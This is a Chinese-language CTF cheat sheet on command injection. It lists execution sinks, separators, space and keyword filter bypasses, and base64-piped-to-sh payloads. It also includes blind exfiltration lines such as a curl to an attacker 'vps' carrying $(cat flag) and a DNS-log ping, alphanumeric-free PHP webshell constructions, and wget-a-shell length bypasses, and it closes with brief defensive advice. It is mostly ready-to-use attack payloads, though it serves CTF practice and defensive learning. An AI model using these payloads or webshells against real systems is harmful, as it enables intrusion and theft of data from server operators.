# 命令执行速查（CTF 向）

## 1. 常见入口

```php
system("cat /flag"); exec(); shell_exec(); passthru(); popen("id","r");
`cat /flag`;  // 反引号
Java: Runtime.getRuntime().exec(); ProcessBuilder
Python: os.system/popen, subprocess.call(shell=True), commands
Node: child_process.exec  (child_process.execFile 无 shell)
```

## 2. 命令分隔/拼接符

```
;      顺序执行
|      管道（前者输出作后者输入）
||     前者失败才执行
&&     前者成功才执行
&      后台执行（分隔）
\n     换行（%0a）
$()    命令替换：cat $(ls)
```
- 黑名单过滤 `;|&` 时：用 `%0a`（URL 编码换行）、`$()`。

## 3. 空格绕过

```
${IFS}   $IFS$9   ${IFS}
<      cat<flag
<>     cat<>flag
%09    （tab）
$IFS   cat$IFS/flag
```

## 4. 关键词绕过

- 拼接：`a=c;b=at;c=flag;$a$b $c`、`echo cat > 1;sh 1`
- base64：`echo Y2F0IGZsYWc=|base64 -d|sh`
- 引号与反斜杠拆分：`c\at fl\ag`、`c'a't`
- 通配符：`/???/??? /flag`（/bin/cat）、`cat fl*`、`cat f?ag`
- 变量替换：`$PATH` 拆字符 `${PATH:0:1}`（bash）
- 读文件替代：`paste`、`diff`、`tac`、`more`、`less`、`head`、`tail`、`nl`、`sort`、`uniq`、`rev`、`od -c`、`xxd`、`base64`、`grep -r flag /`
- 无回显 RCE 外带：`curl http://vps/$(cat flag)`、`wget`、DNS 外带、`ping -c 1 \`cat flag\`.dnslog.cn`

## 5. 无字母数字 webshell（PHP）

```php
<?php $_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;...
# 经典递增构造：利用 "Array"首字母 A → _ 递增拼出函数名
${%ff%ff%ff%ff} 形式 + OR 号取反：
<?php $_=~"\x8f\x97\x8f\x96\x91\x99\x90"; // system
$_($_GET[1]);
```
- 取反绕过：`(~urldecode(%8f...))`；PHP7.0.33 下 `~` 操作对字符串按字节取反。
- 自增法核心：`$_="Array"` 的 `A` 与 `a` 差 32，逐位递增拼 `system`、`phpinfo` 等。

## 6. 长度限制绕过

```
wget <短域名 shell>      # 15 字符限制
* 列目录重定向到文件再执行
```

## 7. Windows

```
| & && 换行
空格用 %PROGRAMFILES:~10,5% 截取
for /f %i in ('dir') do echo %i
```

## 8. 防御

- 白名单校验参数；用 `escapeshellarg`/`escapeshellcmd`（注意连续调用差异）。
- Python 用 `subprocess.run(argv_list, shell=False)`；Java 用 ProcessBuilder 数组形式。
- 降权运行、禁用危险函数（disable_functions）、容器化隔离。
